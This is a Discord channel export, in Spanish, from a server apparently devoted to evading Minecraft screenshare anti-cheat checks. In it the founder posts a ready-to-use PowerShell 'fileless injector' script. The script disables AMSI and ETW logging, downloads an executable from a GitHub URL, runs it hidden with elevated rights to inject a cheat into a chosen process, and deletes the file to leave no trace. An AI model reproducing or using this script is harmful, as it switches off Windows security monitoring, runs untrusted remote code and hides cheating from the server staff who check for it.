@@ -1,0 +1,94 @@
+{
+  "guild": {
+    "id": "1385680731212218449",
+    "name": "Bypass Screenshare",
+    "iconUrl": "https://cdn.discordapp.com/icons/1385680731212218449/3be219b22eb8a5390cc8b0c1c31cf0c6.png?size=512"
+  },
+  "channel": {
+    "id": "1509611382465757244",
+    "type": "GuildTextChat",
+    "categoryId": "1394079719963496499",
+    "category": "metodos simples",
+    "name": "»「\uD83D\uDD27」simple-injector",
+    "topic": null
+  },
+  "dateRange": {
+    "after": null,
+    "before": null
+  },
+  "exportedAt": "2026-06-17T21:18:31.2703503-03:00",
+  "messages": [
+    {
+      "id": "1509612254864347207",
+      "type": "Default",
+      "timestamp": "2026-05-28T14:40:08.799-03:00",
+      "timestampEdited": null,
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "quiero aclarar que este metodo no es el de https://discord.com/channels/1385680731212218449/1394079737533436054/1509606605807812618 por  las dudas XD\n\n\nes un injector fileless bastante simple, va bien en esta categoria, solo  deben indicar la ruta de su cheat y al lado el proceso al que quieren q se injecte, el comando va en powershell\n\n\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\ntry {\n    $ETW = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')\n    $ETW.GetField('etwEnabled','NonPublic,Static').SetValue($null,$false)\n} catch {}\n\n$bytes = (New-Object Net.WebClient).DownloadData('https://github.com/ccsgoq-byte/asd/raw/main/Injector-x64.exe')\n\ntry {\n    $temp = [System.IO.Path]::GetTempFileName() + \".exe\"\n    [IO.File]::WriteAllBytes($temp, $bytes)\n    \n    Start-Process -FilePath $temp -ArgumentList \"C:\\Users\\ccsgo\\Music\\epic.exe\", \"cmd.exe\" -Verb RunAs -WindowStyle Hidden\n    \n    Start-Sleep -Milliseconds 900\n    Remove-Item $temp -Force -ErrorAction SilentlyContinue\n} catch {}\n\n\nlo que hace es descargarlo, ejecutarlo con un nombre random en temp  y lo elimina, te sirve para bypasear la mayoria de servers si lo ejecutan un rato antes de abrir mc ya que no van a poder comprobar que sea un cheat",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [
+        {
+          "id": "1509612254994239508",
+          "url": "https://cdn.discordapp.com/attachments/1509611382465757244/1509612254994239508/image.png?ex=6a342d78&is=6a32dbf8&hm=f72846e29ab9c3a3c6757a2974a705f05fa12baa93bcac98720df351e094cc1b&",
+          "fileName": "image.png",
+          "fileSizeBytes": 6284
+        }
+      ],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1509612432128213084",
+      "type": "Default",
+      "timestamp": "2026-05-28T14:40:51.062-03:00",
+      "timestampEdited": null,
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "(si ustedes indican que quieren q se injecte a cmd, deben tener cmd abierto al poner el comando, lo mismo con los demas procesos)",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    }
+  ],
+  "messageCount": 2
+}
